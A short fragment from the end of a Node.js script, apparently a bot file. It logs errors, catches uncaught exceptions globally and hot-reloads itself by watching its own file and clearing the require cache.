        console.log(require("util").format(err));
    }
};
//==================================================//
process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})
//==================================================//
let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.cyan("File Update => "),
chalk.cyan.bgBlue.bold(`${__filename}`))
delete require.cache[file]
require(file)
})